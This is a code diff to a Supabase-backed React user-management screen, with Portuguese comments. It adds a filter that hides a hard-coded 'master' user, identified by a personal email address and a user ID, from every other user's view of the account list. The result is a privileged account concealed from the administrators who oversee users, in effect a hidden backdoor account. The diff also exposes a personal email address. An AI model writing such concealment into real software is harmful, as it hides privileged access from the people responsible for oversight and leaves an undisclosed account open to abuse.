@@ -104,7 +104,22 @@ export const UserManagement = () => {
         })
       );
 
-      setUsers(usersWithPermissions as UserWithPermissions[]);
+      // Filtrar usuário master oculto (exceto para ele mesmo)
+      const { data: currentUser } = await supabase.auth.getUser();
+      const filteredUsers = usersWithPermissions.filter(user => {
+        // Se é o próprio usuário master, mostrar
+        if (currentUser?.user?.email === 'rodolphogcarvalho@gmail.com') {
+          return true;
+        }
+        
+        // Para outros usuários, ocultar o master principal
+        const isHiddenMaster = user.profiles?.email === 'rodolphogcarvalho@gmail.com' || 
+                               user.user_id === 'ed9fac91-f902-4e84-973e-a0f7c54dd9ed';
+        
+        return !isHiddenMaster;
+      });
+
+      setUsers(filteredUsers as UserWithPermissions[]);
     } catch (error: any) {
       toast({
         title: "Erro",
